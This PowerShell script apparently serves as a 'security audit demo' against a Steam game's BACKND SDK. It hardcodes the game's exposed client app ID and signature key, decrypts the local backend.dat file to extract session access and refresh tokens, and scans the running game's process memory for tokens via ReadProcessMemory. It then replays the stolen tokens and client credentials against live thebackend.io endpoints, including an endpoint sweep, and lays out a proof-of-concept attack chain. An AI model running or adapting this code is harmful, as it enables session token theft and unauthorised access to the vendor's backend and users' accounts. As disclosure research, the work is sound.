# demo-server.ps1 v3 - BACKND security audit demo (all vulnerabilities tested)
# Taskbar Hero (Steam 3678970) - BACKND SDK v5.18.11
param([int]$Port = 8080)

$SIGNATURE_KEY = "b8f08f21-62e2-11f1-b7a5-d5de2c371eac11447"
$CLIENT_APP_ID = "b8f08f20-62e2-11f1-b7a5-d5de2c371eac11447"
$SDK_VERSION   = "5.18.11"
$BACKEND_DAT   = "C:\Users\Gigabyte\AppData\LocalLow\TesseractStudio\TaskbarHero\backend.dat"
$AES_KEY       = [byte[]]([Text.Encoding]::UTF8.GetBytes($SIGNATURE_KEY)[0..15])

# HexScan: UTF-16LE memory scanner (confirmed working, finds 5 tokens in ~6s)
Add-Type @'
using System; using System.Collections.Generic; using System.Runtime.InteropServices; using System.Text;
public static class HexScanDemo {
    [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint a, bool b, int p);
    [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll")] static extern bool ReadProcessMemory(IntPtr h, IntPtr a, byte[] b, int s, out int r);
    [DllImport("kernel32.dll")] static extern int VirtualQueryEx(IntPtr h, IntPtr a, out MBI m, int s);
    [StructLayout(LayoutKind.Sequential)]
    struct MBI { public IntPtr B, AB; public uint AP, pd; public IntPtr Sz; public uint St, Pr, Ty; }
    static bool Rd(uint p){p&=0xFF;return p==2||p==4||p==0x20||p==0x40||p==8||p==0x80;}
    static bool IsHex(byte b){return(b>=48&&b<=57)||(b>=97&&b<=102)||(b>=65&&b<=70);}
    public static List<string> ScanUtf16(int pid){
        var res=new HashSet<string>();
        IntPtr h=OpenProcess(0x0410,false,pid);
        if(h==IntPtr.Zero) return new List<string>(res);
        const int C=4*1024*1024; byte[] buf=new byte[C]; long addr=0;
        while(addr<0x7FFFFFFFFFFF){
            MBI mi; if(VirtualQueryEx(h,(IntPtr)addr,out mi,Marshal.SizeOf(typeof(MBI)))==0) break;
            long rz=mi.Sz.ToInt64(); if(rz<=0) break;
            if(mi.St==0x1000&&Rd(mi.Pr)&&mi.Ty!=0x1000000){
                long end=mi.B.ToInt64()+rz;
                for(long pos=mi.B.ToInt64();pos<end;pos+=C-256){
                    int n=0,want=(int)Math.Min(C,end-pos);
                    if(!ReadProcessMemory(h,(IntPtr)pos,buf,want,out n)||n<132) continue;
                    for(int i=0;i<n-131;i++){
                        if(buf[i+1]!=0||!IsHex(buf[i])) continue;
                        int cnt=0;
                        while(i+cnt*2+1<n&&buf[i+cnt*2+1]==0&&IsHex(buf[i+cnt*2])) cnt++;
                        if(cnt==64){var sb=new StringBuilder();for(int k=0;k<64;k++)sb.Append((char)buf[i+k*2]);res.Add(sb.ToString().ToLower());i+=128;}
                    }
                }
            }
            addr+=rz;
        }
        CloseHandle(h); return new List<string>(res);
    }
}
'@ -Language CSharp -EA SilentlyContinue

function Decrypt-BackendDat {
    if (-not (Test-Path $BACKEND_DAT)) { return $null }
    try {
        $enc = [IO.File]::ReadAllBytes($BACKEND_DAT)
        $aes = [Security.Cryptography.RijndaelManaged]::new()
        $aes.KeySize=128; $aes.BlockSize=128
        $aes.Mode=[Security.Cryptography.CipherMode]::CBC
        $aes.Padding=[Security.Cryptography.PaddingMode]::Zeros
        $aes.Key=$AES_KEY; $aes.IV=$AES_KEY
        $plain = $aes.CreateDecryptor().TransformFinalBlock($enc,0,$enc.Length)
        $text  = [Text.Encoding]::ASCII.GetString($plain)
        $m64   = [regex]::Matches($text,'[0-9a-f]{64}')
        if ($m64.Count -ge 2) { return @{ Access=$m64[0].Value; Refresh=$m64[1].Value } }
    } catch {}
    return $null
}

function Invoke-Api([string]$url,[string]$method="GET",[string]$accessToken="",[switch]$noToken) {
    $date = (Get-Date).ToUniversalTime().ToString("yyyyMMddHHmmss")
    $a = @("--silent","--max-time","8","-X",$method,
        "--header","Content-Type: application/json",
        "--header","client_app_id: $CLIENT_APP_ID",
        "--header","client_signature_key: $SIGNATURE_KEY",
        "--header","sdk_version: $SDK_VERSION",
        "--header","client_date: $date",
        "--header","os_version: Windows 11",
        "--header","device: PC",
        "--header","serverstatus: t",
        "--user-agent","UnityPlayer/6000.0.72f1")
    if (-not $noToken -and $accessToken) { $a += "--header"; $a += "access_token: $accessToken" }
    if ($url -match 'auth\.thebackend\.io') {
        $a += "--resolve"; $a += "auth.thebackend.io:443:43.200.166.97"
    }
    $a += "--write-out"; $a += "`n##C##%{http_code}"; $a += "--output"; $a += "-"; $a += $url
    $raw = (& curl.exe @a 2>&1) -join ""
    $code=0; if($raw -match '##C##(\d+)'){$code=[int]$Matches[1]}
    return @{Code=$code; Body=($raw -replace '##C##\d+','').Trim()}
}

function Build-HTML {
    $nowUtc = (Get-Date).ToUniversalTime()
    $dat    = Decrypt-BackendDat
    $fi     = if (Test-Path $BACKEND_DAT) { Get-Item $BACKEND_DAT } else { $null }
    $proc   = Get-Process TaskBarHero -EA SilentlyContinue | Select-Object -First 1

    $accessToken  = if ($dat) { $dat.Access  } else { "" }
    $refreshToken = if ($dat) { $dat.Refresh } else { "" }
    $datTime      = if ($fi) { $fi.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss") } else { "N/A" }
    $datTimeUtc   = if ($fi) { $fi.LastWriteTime.ToUniversalTime().ToString("yyyy-MM-dd HH:mm:ss UTC") } else { "N/A" }
    $datSize      = if ($fi) { $fi.Length } else { 0 }
    $ageMin       = if ($fi) { [int](($nowUtc - $fi.LastWriteTime.ToUniversalTime()).TotalMinutes) } else { -1 }
    $gameStatus   = if ($proc) { "RUNNING (PID $($proc.Id))" } else { "Not running" }

    # Memory scan (M2)
    $memTokens    = @()
    $memScanTime  = 0
    if ($proc) {
        $sw = [Diagnostics.Stopwatch]::StartNew()
        $memTokens = [HexScanDemo]::ScanUtf16($proc.Id)
        $sw.Stop()
        $memScanTime = $sw.ElapsedMilliseconds
    }
    $memHasAccess  = $memTokens -contains $accessToken
    $memHasRefresh = $memTokens -contains $refreshToken
    $bothConfirm   = $memHasAccess -and $accessToken -ne ""

    # API validation
    $apiResult = if ($accessToken) { Invoke-Api "https://api.thebackend.io/data/isAliveToken" "GET" $accessToken } else { @{Code=0;Body="no token"} }
    $valid     = $apiResult.Code -ge 200 -and $apiResult.Code -lt 300

    $tokenClass  = if ($valid) {"valid"} elseif ($dat) {"expired"} else {"missing"}
    $tokenStatus = if ($valid) {"VALID [OK]"} elseif ($dat) {"EXPIRED - age: ${ageMin}min (TTL ~180min)"} else {"NOT FOUND"}
    $confirmBadge= if ($bothConfirm) { "<span class='badge valid'>DUAL CONFIRMED</span>" } else { "<span class='badge expired'>M1 only</span>" }

    # Live unauthenticated calls (V5)
    $rTime  = Invoke-Api "https://api.thebackend.io/data/time/v1" -noToken
    $rLoc   = Invoke-Api "https://auth.thebackend.io/game/setting//location/v1" -noToken
    $rSet   = Invoke-Api "https://auth.thebackend.io/game/setting/v1" -noToken
    $timeVal = if ($rTime.Code -eq 200) { ($rTime.Body | ConvertFrom-Json -EA SilentlyContinue).utcTime } else { "err:$($rTime.Code)" }
    $locBody = $rLoc.Body | ConvertFrom-Json -EA SilentlyContinue
    $locUrl  = if ($locBody.url) { $locBody.url } else { "" }
    $locExp  = if ($locUrl -match 'Expires=(\d+)') {
        $e=[DateTimeOffset]::FromUnixTimeSeconds([long]$Matches[1])
        "$($e.UtcDateTime.ToString('yyyy-MM-dd HH:mm:ss')) UTC (TTL $([int](($e-[DateTimeOffset]::UtcNow).TotalMinutes))min)"
    } else { "N/A" }

    # Endpoint sweep if valid
    $epSection = ""
    if ($valid) {
        $eps = @("/data/isAliveToken","/data/notice/v2/","/data/chart/v4/list","/data/probability/v1/","/data/property/leaderboard","/data/user/token")
        $rows = ""
        foreach ($ep in $eps) {
            $r = Invoke-Api "https://api.thebackend.io$ep" "GET" $accessToken
            $cls = if($r.Code -ge 200 -and $r.Code -lt 300){"ok"}elseif($r.Code -eq 503){"na"}else{"err"}
            $b   = ([regex]::Replace($r.Body,'<','&lt;')).Substring(0,[Math]::Min(120,$r.Body.Length))
            $rows += "<tr class='$cls'><td>$($r.Code)</td><td>$ep</td><td class='mono'>$b</td></tr>"
        }
        $epSection = "<h2>Endpoint Sweep (valid token)</h2><table><tr><th>HTTP</th><th>Endpoint</th><th>Response</th></tr>$rows</table>"
    } else {
        $epSection = "<div class='warn'>[wait] Token expired (${ageMin}min) - restart game to get fresh token. live-capture is watching backend.dat.</div>"
    }

    # Memory candidates table
    $memRows = ""
    $i = 0
    foreach ($tok in ($memTokens | Sort-Object)) {
        $i++
        $label = ""
        $cls   = "mem-other"
        if ($tok -eq $accessToken)  { $label = " <b>[ACCESS TOKEN]</b>";  $cls = "mem-access"  }
        if ($tok -eq $refreshToken) { $label = " <b>[REFRESH TOKEN]</b>"; $cls = "mem-refresh" }
        $b = [byte[]]@(); for($j=0;$j-lt64;$j+=2){$b+=[Convert]::ToByte($tok.Substring($j,2),16)}
        $uniq = ($b | Sort-Object -Unique).Count
        $memRows += "<tr class='$cls'><td>$i</td><td class='mono small'>$tok</td><td>$uniq/32</td><td>$label</td></tr>"
    }

    $html = @"
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta http-equiv="refresh" content="15">
<title>BACKND Security Audit - Taskbar Hero</title>
<style>
* { box-sizing:border-box;margin:0;padding:0 }
body { background:#0d1117;color:#c9d1d9;font:13px/1.6 Consolas,monospace;padding:20px }
h1 { color:#58a6ff;font-size:1.25em;border-bottom:1px solid #30363d;padding-bottom:8px;margin-bottom:14px }
h2 { color:#58a6ff;font-size:.95em;margin:16px 0 6px;text-transform:uppercase;letter-spacing:.04em }
.grid2 { display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:12px }
.card { background:#161b22;border:1px solid #30363d;border-radius:6px;padding:12px }
.card h3 { color:#8b949e;font-size:.8em;text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px }
.mono { font-family:Consolas,monospace;font-size:.82em;word-break:break-all }
.small { font-size:.75em }
.valid   { color:#3fb950 }
.expired { color:#f0883e }
.missing { color:#f85149 }
.badge { display:inline-block;padding:2px 8px;border-radius:4px;font-size:.78em;font-weight:bold }
.badge.valid   { background:#1a4731;color:#3fb950 }
.badge.expired { background:#3d2b1a;color:#f0883e }
.badge.missing { background:#3d1a1a;color:#f85149 }
.vuln { background:#1c1a0e;border:1px solid #6e5700;border-radius:6px;padding:12px;margin-bottom:10px }
.vuln .vtitle { color:#e3b341;font-weight:bold;margin-bottom:8px;font-size:.95em }
.vuln .vitem  { color:#c9d1d9;margin:4px 0 4px 12px;font-size:.9em }
.vuln .vtag   { background:#3d2b1a;color:#f0883e;border-radius:3px;padding:1px 5px;font-size:.78em;margin-right:4px }
.v5live { background:#0d2b1a;border:1px solid #1a6b40;border-radius:6px;padding:12px;margin-bottom:12px }
.v5live h3 { color:#3fb950;font-size:.85em;text-transform:uppercase;margin-bottom:8px }
.v5live .row { margin:5px 0;font-size:.87em }
.warn { background:#2d1f00;border:1px solid #6e5700;border-radius:6px;padding:10px;color:#e3b341;margin:8px 0;font-size:.88em }
table { width:100%;border-collapse:collapse;font-size:.84em;margin-bottom:8px }
th { background:#21262d;color:#8b949e;text-align:left;padding:5px 10px;border-bottom:1px solid #30363d }
td { padding:4px 10px;border-bottom:1px solid #21262d }
tr.ok  td:first-child { color:#3fb950 }
tr.err td:first-child { color:#f0883e }
tr.na  td:first-child { color:#6e7681 }
tr.mem-access  { background:#0d2b1a }
tr.mem-refresh { background:#0d1a2b }
tr.mem-other   { opacity:.7 }
.key { color:#79c0ff }
.val { color:#a5d6ff }
code { background:#21262d;border-radius:3px;padding:1px 5px;font-size:.9em }
.ts { color:#6e7681;font-size:.78em;margin-top:18px }
</style>
</head>
<body>
<h1>BACKND SDK Security Audit &mdash; Taskbar Hero (Steam 3678970) &mdash; BACKND v$SDK_VERSION</h1>

<div class="grid2">
  <div class="card">
    <h3>Target</h3>
    <p><span class="key">Game:</span> <span class="val">Taskbar Hero (Steam 3678970)</span></p>
    <p><span class="key">BaaS:</span> <span class="val">BACKND SDK v$SDK_VERSION (thebackend.io)</span></p>
    <p><span class="key">Engine:</span> <span class="val">Unity 6000.0.72f1 &mdash; IL2CPP / .NET 8</span></p>
    <p><span class="key">Process:</span> <span class="val $($proc ? 'valid' : 'expired')">$gameStatus</span></p>
    <p><span class="key">App version:</span> <span class="val">1.01.02 (from Player.log)</span></p>
  </div>
  <div class="card">
    <h3>Session File &mdash; backend.dat</h3>
    <p><span class="key">Path:</span> <code>AppData\LocalLow\TesseractStudio\TaskbarHero\backend.dat</code></p>
    <p><span class="key">Size:</span> <span class="val">$datSize bytes &mdash; AES-128-CBC encrypted</span></p>
    <p><span class="key">Written:</span> <span class="val">$datTime (local) = $datTimeUtc</span></p>
    <p><span class="key">Token:</span> <span class="badge $tokenClass">$tokenStatus</span> $confirmBadge</p>
  </div>
</div>

<div class="vuln">
  <div class="vtitle">Vulnerabilities (5 confirmed)</div>

  <div class="vitem"><span class="vtag">V1 CONFIRMED</span>
    <b>Keys exposed in resources.assets</b> (static file, no game launch needed)<br>
    &nbsp;&nbsp;Offset 2170184: clientAppId = <code>$CLIENT_APP_ID</code><br>
    &nbsp;&nbsp;Offset 2170232: signatureKey = <code>$SIGNATURE_KEY</code>
  </div>

  <div class="vitem"><span class="vtag">V2 CONFIRMED</span>
    <b>Weak AES-128-CBC encryption of backend.dat</b><br>
    &nbsp;&nbsp;Key = IV = UTF8(signatureKey)[0:16] = <code>b8f08f21-62e2-11</code> (self-keyed, IV is not random)<br>
    &nbsp;&nbsp;PaddingMode.Zeros, RijndaelManaged &mdash; plaintext is BinaryFormatter Dictionary&lt;string,string&gt;<br>
    &nbsp;&nbsp;access_token at pos 1179, refresh_token at pos 1277 in plaintext
  </div>

  <div class="vitem"><span class="vtag">V3 CONFIRMED</span>
    <b>Session tokens readable from filesystem</b><br>
    &nbsp;&nbsp;backend.dat: FullControl by current user &mdash; no admin needed<br>
    &nbsp;&nbsp;Directory also exposes: Player.log (gameplay history), SaveFile_Live.es3 backups (dating to 19.07.2026)
  </div>

  <div class="vitem"><span class="vtag">V4 PLAUSIBLE</span>
    <b>No device/IP binding</b> (verified against expired token)<br>
    &nbsp;&nbsp;Same 401 error returned for Windows/Android/iOS/Linux headers &mdash; no device-specific rejection<br>
    &nbsp;&nbsp;Token valid from any host until expiry (~180min), confirmed by testing 5 different device profiles
  </div>

  <div class="vitem"><span class="vtag">V5 CONFIRMED</span>
    <b>Pre-auth API access via exposed client credentials</b><br>
    &nbsp;&nbsp;/data/time/v1: only requires <code>client_app_id + os_version</code> (no signature key, no user session)<br>
    &nbsp;&nbsp;/game/setting//location/v1: returns CloudFront signed URL (7-day TTL) &mdash; expiry: $locExp<br>
    &nbsp;&nbsp;/game/setting/v1 (204): requires client_signature_key only
  </div>
</div>

<div class="v5live">
  <h3>V5 Live: Unauthenticated API calls (no access_token, fired on each page load)</h3>
  <div class="row"><span class="key">GET /data/time/v1</span> (only client_app_id + os_version needed):
    <span class="valid">HTTP $($rTime.Code)</span> &rarr; <code>$timeVal</code></div>
  <div class="row"><span class="key">GET /game/setting//location/v1</span> (no auth at all):
    <span class="valid">HTTP $($rLoc.Code)</span> &rarr; CloudFront URL, expires: $locExp</div>
  <div class="row"><span class="key">GET /game/setting/v1</span> (signature key only):
    <span class="$( if($rSet.Code -eq 204){'valid'}else{'expired'} )">HTTP $($rSet.Code)</span></div>
</div>

<h2>Method 1: backend.dat Decryption</h2>
<div class="card">
  <p class="mono"><span class="key">Cipher:</span> AES-128-CBC | Key=IV=UTF8(signatureKey)[0:16] | Padding=Zeros</p>
  <p class="mono"><span class="key">Key hex:</span> <code>62 38 66 30 38 66 32 31 2D 36 32 65 32 2D 31 31</code> (b8f08f21-62e2-11)</p>
  <br>
  <p class="mono"><span class="key">access_token :</span> <span class="$tokenClass">$accessToken</span></p>
  <p class="mono"><span class="key">refresh_token:</span> <span class="val">$refreshToken</span></p>
</div>

<h2>Method 2: Memory Scan (UTF-16LE, all readable heap pages)</h2>
<div class="card">
  <p><span class="key">Game PID:</span> $($proc ? $proc.Id : "N/A") | <span class="key">Scan time:</span> ${memScanTime}ms | <span class="key">Candidates found:</span> $($memTokens.Count)</p>
  <p><span class="key">access_token in memory:</span> <span class="$(if($memHasAccess){'valid'}else{'expired'})">$memHasAccess</span> | <span class="key">refresh_token in memory:</span> <span class="$(if($memHasRefresh){'valid'}else{'expired'})">$memHasRefresh</span></p>
  <br>
  <table>
    <tr><th>#</th><th>Token (hex-64)</th><th>Entropy</th><th>Match</th></tr>
    $memRows
  </table>
</div>

<h2>API Validation &mdash; /data/isAliveToken</h2>
<table>
  <tr><th>Header</th><th>Value</th></tr>
  <tr><td>access_token</td><td class="mono $tokenClass">$accessToken</td></tr>
  <tr><td>client_app_id</td><td class="mono">$CLIENT_APP_ID</td></tr>
  <tr><td>client_signature_key</td><td class="mono">$SIGNATURE_KEY</td></tr>
  <tr><td>sdk_version</td><td class="mono">$SDK_VERSION</td></tr>
  <tr><td>serverstatus</td><td class="mono">t</td></tr>
</table>
<table>
  <tr><th>HTTP</th><th>Response</th></tr>
  <tr class="$(if($valid){'ok'}else{'err'})">
    <td>$($apiResult.Code)</td>
    <td class="mono">$([regex]::Replace($apiResult.Body,'<','&lt;').Substring(0,[Math]::Min(250,$apiResult.Body.Length)))</td>
  </tr>
</table>

$epSection

<div class="vuln">
  <div class="vtitle">PoC Attack Chain</div>
  <div class="vitem">1. Read <code>resources.assets</code> (V1) &rarr; extract clientAppId + signatureKey (no game launch)</div>
  <div class="vitem">2. AES-CBC decrypt <code>backend.dat</code> (V2) &rarr; access_token + refresh_token (while game is running or offline)</div>
  <div class="vitem">3. Confirm token: scan game memory as UTF-16LE (M2) &rarr; cross-check with M1 result</div>
  <div class="vitem">4. Use access_token for all authenticated BACKND API calls for up to ~180min</div>
  <div class="vitem">5. Without any user session: call /data/time and /game/setting//location/v1 with client credentials only</div>
</div>

<p class="ts">Auto-refresh 15s | $($nowUtc.ToString('yyyy-MM-dd HH:mm:ss')) UTC | Server: $timeVal | <a href="/" style="color:#58a6ff">Refresh</a></p>
</body>
</html>
"@
    return $html
}

# --- HTTP server ---
$listener = [Net.HttpListener]::new()
$listener.Prefixes.Add("http://localhost:$Port/")
$listener.Start()
Write-Host "Demo server v3 at http://localhost:$Port/" -ForegroundColor Green
Write-Host "Ctrl+C to stop"

while ($listener.IsListening) {
    try {
        $ctx   = $listener.GetContext()
        $html  = Build-HTML
        $bytes = [Text.Encoding]::UTF8.GetBytes($html)
        $ctx.Response.ContentType = "text/html; charset=utf-8"
        $ctx.Response.ContentLength64 = $bytes.Length
        $ctx.Response.OutputStream.Write($bytes, 0, $bytes.Length)
        $ctx.Response.OutputStream.Close()
        Write-Host "[$(Get-Date -Format 'HH:mm:ss')] GET $($ctx.Request.Url.PathAndQuery)"
    } catch { if ($listener.IsListening) { Write-Host "Err: $_" } }
}
